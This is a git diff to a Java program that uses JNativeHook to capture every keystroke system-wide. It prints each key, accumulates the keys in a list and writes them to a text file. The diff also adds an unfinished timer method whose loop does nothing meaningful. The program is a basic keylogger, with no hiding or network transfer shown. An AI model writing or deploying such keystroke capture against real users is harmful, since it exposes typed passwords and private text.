@@ -1,6 +1,8 @@
 package my;
 
 import java.io.IOException;
+import java.util.ArrayList;
+import java.util.List;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 
@@ -14,8 +16,11 @@ import org.jnativehook.keyboard.NativeKeyListener;
  */
 import static my.file.myTXT.createFile;
 import static my.file.myTXT.writeFile;
+import static my.file.myTXT.currentDateTime;
 
 public class Main implements NativeKeyListener {
+
+    static private List<String> myList = new ArrayList<>();
 
     public static void main (String[] args) throws IOException {
         
@@ -29,6 +34,8 @@ public class Main implements NativeKeyListener {
             e.printStackTrace();
         }
         GlobalScreen.addNativeKeyListener(new Main());
+
+        myTimer();
     }
 
     @Override
@@ -40,9 +47,10 @@ public class Main implements NativeKeyListener {
         String keyString = nativeEvent.getKeyText(keyCode);
         System.out.println("Tecla pulsada (Código VK): " + keyCode);
         System.out.println("Letra: "+keyString);
+        myList.add(keyString);
         
         try {
-            writeFile(keyString);
+            writeFile(myList);
         } catch (IOException e) {
             e.printStackTrace();
         }
@@ -50,4 +58,19 @@ public class Main implements NativeKeyListener {
 
     @Override
     public void nativeKeyReleased(NativeKeyEvent nativeEvent) {}
+
+    private static void myTimer () {
+        boolean suspense = true;
+        int minute = currentDateTime.now().getMinute();
+        int plus = minute+2;
+        int i = 1;
+        System.out.println(currentDateTime.now().getMinute());
+        while (i <= plus) {
+            i++;
+        }
+        //System.out.println(currentDateTime.getMinute());
+
+        //return actived;
+    } 
+
 }
